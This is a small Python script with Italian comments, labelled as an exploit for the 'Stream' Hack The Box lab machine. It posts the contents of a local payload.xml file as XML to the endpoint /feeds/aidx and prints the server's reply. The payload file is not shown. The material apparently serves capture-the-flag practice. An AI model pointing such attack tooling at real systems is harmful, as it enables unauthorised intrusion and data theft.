import requests
import argparse
import json

def main():
    parser=argparse.ArgumentParser(description="Exploit per la macchina Stream HTB")

    parser.add_argument("-u","--url",required=True,help="url del target")
    parser.add_argument("-p","--port",default=80,help="porta del target")
    parser.add_argument("-e","--endpoint",default="/",help="endpoint dell'url")
    parser.add_argument("-x","--method",default="GET",help="metodo HTTP")

    argomenti=parser.parse_args()

    url=argomenti.url
    porta=argomenti.port
    endpoint=argomenti.endpoint
    metodo=argomenti.method.upper()

    target=f"{url}:{porta}{endpoint}"

    header={
        "Content-Type":"application/xml"
    }

    try:
        print("[+] costruzione richiesta...")
        # controllo IF specifico per questa macchina
        if metodo=='POST' and endpoint=="/feeds/aidx":
            print("[+] apertura file XML...")
            # apertura file
            try:
                # apre il file in maniera sicura e gestisce chiusura e crash
                with open("payload.xml","r") as file:
                    # lettura del file
                    payload_xml=file.read()
                print("[+] file aperto")
            except:
                print("[!] errore di apertura del file")
                # ferma correttamente ---> fortemente consigliato
                return
            # invio della richiesta con il payload
            richiesta=requests.request(method=metodo,url=target,headers=header,data=payload_xml,timeout=10)
        else:
            richiesta=requests.request(method=metodo,url=target,timeout=10)
        print("[+] richiesta inviata")
        if richiesta.status_code==200:
            print("[+] richiesta accettata")
            print(f"[+] codice risposta: {richiesta.status_code}")
            # gestione degli errori di formattazione
            try:
                # estraggo la risposta e la converto in json
                risposta_json=richiesta.json()
                # stampo la risposta json formattata
                print(json.dumps(risposta_json,indent=4,ensure_ascii=True))
            except:
                print("[!] errore nella formattazione json, controllare il tipo di risposta")
                print(richiesta.text)
        else:
            print("[!] errore nella richiesta o codice risposta diverso da 200")
            print(f"[+] codice risposta: {richiesta.status_code}")
            # gestione degli errori di formattazione
            try:
                # estraggo la risposta e la converto in json
                risposta_json=richiesta.json()
                # stampo la risposta json formattata
                print(json.dumps(risposta_json,indent=4,ensure_ascii=True))
            except:
                print("[!] errore nella formattazione json, controllare il tipo di risposta")
                print(richiesta.text)
    except:
        print("ERRORE EXPLOIT")

if __name__=='__main__':
    main()